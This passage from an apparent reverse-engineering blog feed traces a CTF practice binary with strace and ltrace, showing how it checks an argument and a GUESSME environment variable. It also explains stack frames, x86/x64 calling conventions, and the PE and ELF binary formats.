mprotect(<span style="color:#ae81ff">0x7f7034348000</span>, <span style="color:#ae81ff">40960</span>, PROT_READ) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mprotect(<span style="color:#ae81ff">0x7f7034559000</span>, <span style="color:#ae81ff">4096</span>, PROT_READ) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mprotect(<span style="color:#ae81ff">0x601000</span>, <span style="color:#ae81ff">4096</span>, PROT_READ) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mprotect(<span style="color:#ae81ff">0x7f7034780000</span>, <span style="color:#ae81ff">4096</span>, PROT_READ) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
munmap(<span style="color:#ae81ff">0x7f7034759000</span>, <span style="color:#ae81ff">150611</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
brk(NULL) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1053000</span>
brk(<span style="color:#ae81ff">0x1085000</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1085000</span>
fstat(<span style="color:#ae81ff">1</span>, st_mode<span style="color:#f92672">=</span>S_IFCHR<span style="color:#f92672">|</span><span style="color:#ae81ff">0620</span>, st_rdev<span style="color:#f92672">=</span>makedev(<span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">1</span>), ...) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">➎</span> write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;checking &#39;show_me_the_flag&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">28</span>checking <span style="color:#960050;background-color:#1e0010">&#39;</span>show_me_the_flag<span style="color:#960050;background-color:#1e0010">&#39;</span>
) <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
<span style="color:#960050;background-color:#1e0010">➏</span> write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;ok</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">3</span>ok
) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">➐</span> exit_group(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">?</span>
<span style="color:#f92672">+++</span> exited with <span style="color:#ae81ff">1</span> <span style="color:#f92672">+++</span>
</code></pre></div><p>When tracing a program from the start, strace includes all the system calls used by the program interpreter to set up the process, making the output quite verbose. The first system call in the output is execve, which is called by your shell to launch the program ➊. After that, the program interpreter takes over and starts setting up the execution environment. This involves setting up memory regions and setting the correct memory access permissions using mprotect. Additionally, you can see the system calls used to look up and load the required dynamic libraries. The dynamic linker is searching for the lib5ae9b7f.so library in a number of standard subfolders, followed by in your current working directory (➋ /ch3) since LD_LIBRARY_PATH environment variable was set to it earlier to tell the dynamic linker to add your current working directory to its search path. When the library is found, the dynamic linker reads it and maps it into memory ➌. The setup process is repeated for other required libraries, such as libstdc++.so.6 ➍, and it accounts for the vast majority of the strace output. It isn’t until the last three system calls that you finally see application specific behavior. The first system call used is write, which is used to print checking &lsquo;show_me_the_flag&rsquo; to the screen ➎. You see another write call to print the string ok ➏, and finally, there’s a call to exit_group, which leads to the exit with status code 1 ➐.</p>
<h2 id="library-call-trace">Library Call Trace</h2>
<p><strong>ltrace</strong> can be used to investigate system call behavior.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> ltrace <span style="color:#f92672">-</span>i <span style="color:#f92672">-</span>C .<span style="color:#f92672">/</span>ctf show_me_the_flag
<span style="color:#960050;background-color:#1e0010">➊</span> [<span style="color:#ae81ff">0x400fe9</span>] __libc_start_main (<span style="color:#ae81ff">0x400bc0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x7ffc22f441e8</span>, <span style="color:#ae81ff">0x4010c0</span> <span style="color:#f92672">&lt;</span>unfinished ...<span style="color:#f92672">&gt;</span>
<span style="color:#960050;background-color:#1e0010">➋</span> [<span style="color:#ae81ff">0x400c44</span>] __printf_chk (<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x401158</span>, <span style="color:#ae81ff">0x7ffc22f4447f</span>, <span style="color:#ae81ff">160</span>checking <span style="color:#960050;background-color:#1e0010">&#39;</span>show_me_the_flag<span style="color:#960050;background-color:#1e0010">&#39;</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
<span style="color:#960050;background-color:#1e0010">➌</span> [<span style="color:#ae81ff">0x400c51</span>] strcmp (<span style="color:#e6db74">&#34;show_me_the_flag&#34;</span>, <span style="color:#e6db74">&#34;show_me_the_flag&#34;</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">➍</span> [<span style="color:#ae81ff">0x400cf0</span>] puts (<span style="color:#e6db74">&#34;ok&#34;</span>ok) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">➎</span> [<span style="color:#ae81ff">0x400d07</span>] rc4_init (rc4_state_t<span style="color:#f92672">*</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>, <span style="color:#66d9ef">int</span>)
(<span style="color:#ae81ff">0x7ffc22f43fb0</span>, <span style="color:#ae81ff">0x4011c0</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">0x7fe979b0d6e0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">➏</span> [<span style="color:#ae81ff">0x400d14</span>] std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>, std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>,
std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::</span> assign (<span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">*</span>)
(<span style="color:#ae81ff">0x7ffc22f43ef0</span>, <span style="color:#ae81ff">0x40117b</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffc22f43ef0</span>
<span style="color:#960050;background-color:#1e0010">➐</span> [<span style="color:#ae81ff">0x400d29</span>] rc4_decrypt (rc4_state_t<span style="color:#f92672">*</span>, std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,
std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>, std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;&amp;</span>)
(<span style="color:#ae81ff">0x7ffc22f43f50</span>, <span style="color:#ae81ff">0x7ffc22f43fb0</span>, <span style="color:#ae81ff">0x7ffc22f43ef0</span>, <span style="color:#ae81ff">0x7e889f91</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffc22f43f50</span>
<span style="color:#960050;background-color:#1e0010">➑</span> [<span style="color:#ae81ff">0x400d36</span>] std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>, std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>,
std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::</span> _M_assign (std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,
std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>, std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span>)
(<span style="color:#ae81ff">0x7ffc22f43ef0</span>, <span style="color:#ae81ff">0x7ffc22f43f50</span>, <span style="color:#ae81ff">0x7ffc22f43f60</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">➒</span> [<span style="color:#ae81ff">0x400d53</span>] getenv (<span style="color:#e6db74">&#34;GUESSME&#34;</span>) <span style="color:#f92672">=</span> nil
[<span style="color:#ae81ff">0xffffffffffffffff</span>] <span style="color:#f92672">+++</span> exited (status <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+++</span>
</code></pre></div><p>The first library call is __libc_start_main ➊, which is called from the _start function to transfer control to the program’s main function. Once main is started, its first library call prints the now familiar checking &hellip; string to the screen ➋. The actual check turns out to be a string comparison, which is implemented using strcmp, and verifies that the argument given to ctf is equal to show_me_the_flag ➌. If this is the case, ok is printed to the screen ➍. So far, this is mostly behavior you’ve seen before. But now you see something new: the RC4 cryptography is initialized through a call to rc4_init, which is located in the library you extracted earlier ➎. After that, you see an assign to a C++ string, presumably initializing it with an encrypted message ➏. This message is then decrypted with a call to rc4_decrypt ➐, and the decrypted message is assigned to a new C++ string ➑. Finally, there’s a call to getenv, which is a standard library function used to look up environment variables ➒. You can see that ctf expects an environment variable called GUESSME! The name of this variable may well be the string that was decrypted earlier. Let’s see whether ctf ’s behavior changes when you set a dummy value for the GUESSME environment variable as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> GUESSME<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>foobar<span style="color:#960050;background-color:#1e0010">&#39;</span> ltrace <span style="color:#f92672">-</span>i <span style="color:#f92672">-</span>C .<span style="color:#f92672">/</span>ctf show_me_the_flag
...
[<span style="color:#ae81ff">0x400d53</span>] getenv (<span style="color:#e6db74">&#34;GUESSME&#34;</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;foobar&#34;</span>
<span style="color:#960050;background-color:#1e0010">➊</span> [<span style="color:#ae81ff">0x400d6e</span>] std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>, std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>,
std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::</span> assign (<span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">*</span>)
(<span style="color:#ae81ff">0x7fffc7af2b00</span>, <span style="color:#ae81ff">0x401183</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fffc7af2b00</span>
<span style="color:#960050;background-color:#1e0010">➋</span> [<span style="color:#ae81ff">0x400d88</span>] rc4_decrypt (rc4_state_t<span style="color:#f92672">*</span>, std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,
std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>, std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;&amp;</span>)
(<span style="color:#ae81ff">0x7fffc7af2b60</span>, <span style="color:#ae81ff">0x7fffc7af2ba0</span>, <span style="color:#ae81ff">0x7fffc7af2b00</span>, <span style="color:#ae81ff">0x401183</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fffc7af2b60</span>
[<span style="color:#ae81ff">0x400d9a</span>] std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>, std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>,
std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::</span> _M_assign (std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,
std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>, std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span>)
(<span style="color:#ae81ff">0x7fffc7af2b00</span>, <span style="color:#ae81ff">0x7fffc7af2b60</span>, <span style="color:#ae81ff">0x7700a0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
[<span style="color:#ae81ff">0x400db4</span>] operator delete (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)(<span style="color:#ae81ff">0x7700a0</span>, <span style="color:#ae81ff">0x7700a0</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">➌</span> [<span style="color:#ae81ff">0x400dd7</span>] puts (<span style="color:#e6db74">&#34;guess again!&#34;</span>guess again<span style="color:#f92672">!</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
[<span style="color:#ae81ff">0x400c8d</span>] operator delete (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)(<span style="color:#ae81ff">0x770050</span>, <span style="color:#ae81ff">0x76fc20</span>, <span style="color:#ae81ff">0x7f70f99b3780</span>, <span style="color:#ae81ff">0x7f70f96e46e0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
[<span style="color:#ae81ff">0xffffffffffffffff</span>] <span style="color:#f92672">+++</span> exited (status <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+++</span>
</code></pre></div><p>After the call to getenv, ctf goes on to assign ➊ and decrypt ➋ another C++ string. Unfortunately, between the decryption and the moment that guess again is printed to the screen ➌, you don’t see any hints regarding the expected value of GUESSME. This tells you that the comparison of GUESSME to its expected value is implemented without the use of any library functions.</p>
]]></content>
        </item>
        
        <item>
            <title>Stack and it&#39;s Frames</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/10/stack-and-its-frames/</link>
            <pubDate>Tue, 10 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/10/stack-and-its-frames/</guid>
            <description>Stack is a data structure, and means exactly what it&amp;rsquo;s name says - a stack(of objects). It is mainly characterized by pushing and popping operations. You push items onto the stack, and then pop those items off. A stack is therefore a LIFO(last in, first out) structure. Memory for functions, local variables, and flow control is stored in the stack.
Stack Layout The stack grows from higher addresses to lower addresses.</description>
            <content type="html"><![CDATA[<p><strong>Stack</strong> is a data structure, and means exactly what it&rsquo;s name says - a stack(of objects). It is mainly characterized by pushing and popping operations. You push items onto the stack, and then pop those items off. A stack is therefore a <strong>LIFO</strong>(last in, first out) structure. </p>
<p>Memory for functions, local variables, and flow control is stored in the stack.</p>
<h3 id="stack-layout">Stack Layout</h3>
<p>The stack grows from higher addresses to lower addresses. This behavior can be categorized as <em>growing downwards</em> or <em>allocation in a top-down manner</em>. Therefore, top of the stack is actually the lower-most address being used by the stack at that moment.</p>
<p><img src="/Stack_and_it's_Frames/1Yz9K.gif" alt="why do structure&rsquo;s data members memory allocated from lower to &hellip;">
<em>Stack growing downwards.</em></p>
<p>Each time a function call is performed, a new <strong>Stack Frame</strong> is generated. A function maintains its own stack frame until it returns, at which time the caller’s stack frame is restored and execution is transferred back to the calling function.</p>
<p><img src="/Stack_and_it's_Frames/image.png" alt="&ldquo;stack&rdquo;">
<em>Stack Layout (Reversed top-bottom for easy explanation).</em></p>
<p>Calling conventions require parameters to be passed on the stack on x86. On x64, most calling conventions pass parameters through registers. For example, on Windows x64, there is only one calling convention and the fi rst four parameters are passed through  On Linux, the fi rst six parameters are passed on .</p>
<h3 id="function-calls">Function Calls</h3>
<p>When a function is called, the flow of code execution is transferred to a it&rsquo;s memory location. This transfer of flow has to be setup neatly so that if need be(which generally is the case), the current memory location can be returned to without anything going awry.</p>
<p><strong>Function Prologue</strong> is executed as soon as the function is called. It consists of a few lines of code that are executed right at the beginning of the function that prepares the stack and the registers for use within this function.</p>
<p><strong>Function Epilogue</strong> is executed when the function tries to return. It consists of a few lines of code that are executed right at the end of the function so as to restore the stack and registers to the state they were in before the function is called.</p>
<h5 id="calling-conventions-for-x86">Calling Conventions for x86:</h5>
<p>The x86 architecture requires all function arguments to be pushed on the stack before the function is called.</p>
<p>Function Prologue:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">    <span style="color:#a6e22e">push</span>  ebp         <span style="color:#75715e">; Save the stack-frame base pointer (of the calling function).</span>
    <span style="color:#a6e22e">mov</span>   ebp, esp    <span style="color:#75715e">; Set the stack-frame base pointer to the current location on the stack.</span>
    <span style="color:#a6e22e">sub</span>   esp, N      <span style="color:#75715e">; Grow the stack by N bytes to reserve space for local variables.</span>
</code></pre></div><p>Function Epilogue:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">    <span style="color:#a6e22e">mov</span>   esp, ebp    <span style="color:#75715e">; Put the stack pointer back where it was when this function was called.</span>
    <span style="color:#a6e22e">pop</span>   ebp         <span style="color:#75715e">; Restore the calling function&#39;s stack frame.</span>
    <span style="color:#a6e22e">ret</span>               <span style="color:#75715e">; Return to the calling function.</span>
</code></pre></div><p> The <code>leave</code> instruction can be used in place of the first two instructions because it sets <code>ESP</code> to equal <code>EBP</code> and pops <code>EBP</code> off the stack.</p>
<h5 id="calling-conventions-for-x64">Calling Conventions for x64:</h5>
<p>The x64 architecture requires the first six function arguments to be set in registers in the following order: <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, and <code>R9</code>; the remaining are pushed on the stack from right to left.</p>
<p>Disclaimer: Windows requires the first four function arguments to be set in registers in the following order: <code>RCX</code>, <code>RDX</code>, <code>R8</code>, and <code>R9</code>; the remaining are pushed on the stack from right to left.</p>
<p>Function Prologue:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">    <span style="color:#a6e22e">mov</span>    [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>], rcx    <span style="color:#75715e">; Saves argument register in home-location.</span>
    <span style="color:#a6e22e">push</span>   r15               <span style="color:#75715e">; Saves the volatile register r15.</span>
    <span style="color:#a6e22e">push</span>   r14               <span style="color:#75715e">; Saves the volatile register r14.</span>
    <span style="color:#a6e22e">push</span>   r13               <span style="color:#75715e">; Saves the volatile register r13.</span>
    <span style="color:#a6e22e">sub</span>    rsp, N            <span style="color:#75715e">; Grow the stack by N bytes to reserve space for local variables.</span>
    <span style="color:#a6e22e">lea</span>    r13, <span style="color:#ae81ff">128</span>[rsp]     <span style="color:#75715e">; Establish a frame pointer to point 128 bytes into the allocated space.</span>
</code></pre></div><p>Function Epilogue:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">    <span style="color:#a6e22e">lea</span>   rsp, <span style="color:#f92672">-</span><span style="color:#ae81ff">128</span>[r13]    <span style="color:#75715e">; Frame pointer&#39;s value is restored if it was used in the function.</span>
        <span style="color:#75715e">; epilogue proper starts here</span>
    <span style="color:#a6e22e">add</span>   rsp, N            <span style="color:#75715e">; Destroy the stack frame by pointing the stack pointer before the frame.</span>
    <span style="color:#a6e22e">pop</span>   r13               <span style="color:#75715e">; Restore the volatile register r13.</span>
    <span style="color:#a6e22e">pop</span>   r14               <span style="color:#75715e">; Restore the volatile register r14.</span>
    <span style="color:#a6e22e">pop</span>   r15               <span style="color:#75715e">; Restore the volatile register r15.</span>
    <span style="color:#a6e22e">ret</span>                     <span style="color:#75715e">; Return to the calling function.</span>
</code></pre></div><p>Disclaimer:</p>
<p>The only differences between the architectures x86 and x64 we are concerned with at the moment are:</p>
<ul>
<li>Calling conventions (discussed above)</li>
<li>Names of the registers and their functions (factual, refer to documentations)</li>
<li>Address length (x86: 32 bit, x64: 64bit)</li>
</ul>
<p>Since these differences have been tended to more or less, the following material is in reference to the x86 architecture since it&rsquo;s much more elaborate.</p>
<h3 id="flow-of-control">Flow of Control:</h3>
<ol>
<li>Arguments are placed on the stack using <code>push</code> instructions.</li>
<li>The function is called using <code>call memory_location</code>. This causes the current instruction address (that is, the contents of the <code>EIP</code> register) to be pushed onto the stack. This address will be used to return to the main code when the function is finished. When the function begins, <code>EIP</code> is set to <em>memory_location</em> (the start of the function).</li>
<li>Through the use of a Function Prologue, space is allocated on the stack for local variables and <code>EBP</code> (the base pointer) is pushed onto the stack. This is done to save <code>EBP</code> for the calling function.</li>
<li>The function performs its work.</li>
<li>Through the use of a Function Epilogue, the stack is restored. <code>ESP</code> is adjusted to free the local variables, and <code>EBP</code> is restored so that the calling function can address its variables properly.</li>
<li>The function returns by calling the <code>ret</code> instruction. This pops the return address off the stack and into <code>EIP</code>, so that the program will continue executing from where the original call was made.</li>
<li>The stack is adjusted to remove the arguments that were sent, unless they’ll be used again later.</li>
</ol>
<h3 id="stack-and-frame-analysis">Stack and Frame Analysis</h3>
<p><img src="/Stack_and_it's_Frames/1_image.png" alt="&ldquo;stack_frame&rdquo;">
<em>Individual stack frame (notice how addresses go from higher to lower from bottom to top).</em></p>
<ul>
<li><code>ESP</code> would point to the top of the stack, which is the memory address <code>0x12F02C</code>.
<ul>
<li>Whenever data is pushed onto the stack, ESP will be decreased. This is because it will grow towards a lower address.</li>
<li>If the instruction <code>push eax</code> were executed, <code>ESP</code> would be decremented by four and would contain <code>0x12F028</code>, and the data contained in <code>EAX</code> would be copied to <code>0x12F028</code>.</li>
<li>If the instruction <code>pop eax</code> were executed, the data at <code>0x12F028</code> would be moved into <code>EAX</code>, and then <code>ESP</code> would be incremented by four.</li>
<li>Mind you, the value still remains there, it&rsquo;s just invalidated by the system since it is now not in use by the stack and is waiting for either to be overwritten or cleared.</li>
</ul>
</li>
<li><code>EBP</code> would be set to <code>0x12F03C</code> throughout the duration of the function, so that the local variables and arguments can be referenced using it.</li>
<li>The arguments that are pushed onto the stack before the call are shown at the bottom of the stack frame.</li>
<li>Next, it contains the return address that is put on the stack automatically by the call instruction. The <code>old EBP</code> is next on the stack; this is the EBP from the caller’s stack frame.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>The PE Format</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/06/the-pe-format/</link>
            <pubDate>Fri, 06 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/06/the-pe-format/</guid>
            <description>PE is a modified version of the Common Object File Format (COFF), thus also referred to as PE/COFF. The 64-bit version of PE is called PE32+. The structure is defined in WinNT.h, which is included in the Microsoft Windows Software Developer Kit.  PE32+ binary structure
 An MS-DOS header is included for backward compatibility. Thus it can also be interpreted as an MS-DOS binary. The main function of the MS-DOS header is to describe how to load and execute an MS-DOS stub, which comes right after the MSDOS header.</description>
            <content type="html"><![CDATA[<ul>
<li>PE is a modified version of the <strong>Common Object File Format</strong> (<strong>COFF</strong>), thus also referred to as <strong>PE/COFF</strong>.</li>
<li>The 64-bit version of PE is called <strong>PE32+.</strong></li>
<li>The structure is defined in <strong>WinNT.h</strong>, which is included in the <strong>Microsoft Windows Software Developer Kit</strong>.</li>
</ul>
<p><img src="/The_PE_Format/image.png" alt="64-bit_pe_structure">
<em>PE32+ binary structure</em></p>
<ul>
<li>An <strong>MS-DOS header</strong> is included for backward compatibility. Thus it can also be interpreted as an MS-DOS binary.</li>
<li>The main function of the MS-DOS header is to describe how to load and execute an <strong>MS-DOS stub</strong>, which comes right after the MSDOS header. This stub is usually just a small MS-DOS program, which is run instead of the main program when the user executes a PE binary in MSDOS. The MS-DOS stub program typically prints a string like “This program cannot be run in DOS mode” and then exits. However, in principle, it can be a full-fledged MS-DOS version of the program.</li>
<li>The MS-DOS header starts with a magic value, which consists of the ASCII characters <strong>MZ</strong>. For this reason, it’s also sometimes referred to as an <strong>MZ header</strong>.</li>
<li>The field <strong>e_lfanew</strong> contains the file offset at which the real PE binary begins. Thus, when a PE-aware program loader opens the binary, it can read the MS-DOS header and then skip past it and the MS-DOS stub to go right to the start of the PE headers.</li>
</ul>
<h2 id="executable-header">Executable Header</h2>
<p>The struct <strong>IMAGE_NT_HEADERS64</strong> encompasses a 32- bit signature, a PE file header, and a PE optional header. You could say that struct IMAGE_NT_HEADERS64 as a whole is PE’s version of the executable header.</p>
<ul>
<li>The PE signature is simply a string containing the ASCII characters <strong>PE</strong>, followed by two NULL characters. It’s analogous to the magic bytes in the e_ident field in ELF’s executable header.</li>
<li>The file header describes general properties of the file. The most important fields are <em>Machine</em>, <em>NumberOfSections</em>, <em>SizeOfOptionalHeader</em>, and <em>Characteristics</em>.</li>
<li>The PE optional header provides metadata. It may be missing in object files.</li>
</ul>
<h2 id="section-header-table">Section Header Table</h2>
<ul>
<li>An array of <strong>IMAGE_SECTION_HEADER</strong> structures, each of which describes a single section, denoting its size in the file and in memory (SizeOfRawData and VirtualSize), its file offset and virtual address (PointerToRawData and VirtualAddress), relocation information, and any flags (Characteristics).
<ul>
<li>The flags describe whether the section is executable, readable, writable, or some combination of these.</li>
</ul>
</li>
<li>Instead of referring to a string table as the ELF section headers do, PE section headers specify the section name using a simple character array field, aptly called <em><strong>Name</strong></em>. Because the array is only 8 bytes long, PE section names are limited to 8 characters.</li>
<li>PE format does not explicitly distinguish between sections and segments. The closest thing PE files have to ELF’s execution view is the <strong>DataDirectory</strong>, which provides the loader with a shortcut to certain portions of the binary needed for setting up the execution.</li>
<li>There is no separate program header table; the section header table is used for both linking and loading.</li>
</ul>
<h2 id="sections">Sections</h2>
<p>Many of the sections in PE files are directly comparable to ELF sections, often even having (almost) the same name.</p>
<ul>
<li>The <strong>.idata</strong> section specifies which symbols (functions and data) the binary imports from shared libraries, or DLLs in Windows terminology.</li>
<li>The <strong>.edata</strong> section lists the symbols and their addresses that the binary exports.
<ul>
<li>To resolve references to external symbols, the loader needs to match up the required imports with the export table of the DLL that provides the required symbols.</li>
<li>In practice, you may find that the .idata and .edata sections are merged into .rdata, but their contents and workings remain the same.</li>
</ul>
</li>
<li>When the loader resolves dependencies, it writes the resolved addresses into the <strong>Import Address Table</strong> (<strong>IAT</strong>). Similar to the Global Offset Table in ELF, the IAT is simply a table of resolved pointers with one slot per pointer.
<ul>
<li>The IAT is also part of the .idata section, and it initially contains pointers to the names or identifying numbers of the symbols to be imported.</li>
<li>The dynamic loader then replaces these pointers with pointers to the actual imported functions or variables. A call to a library function is then implemented as a call to a <em><strong>thunk</strong></em> for that function, which is nothing more than an indirect jump through the IAT slot for the function.</li>
</ul>
</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>The ELF Format</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/03/the-elf-format/</link>
            <pubDate>Tue, 03 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/03/the-elf-format/</guid>
            <description>ELF binaries really consist of only four types of components:  Executable Header Program Headers (optional) Sections Section Headers, one per section (optional)  64-bit ELF binary structure
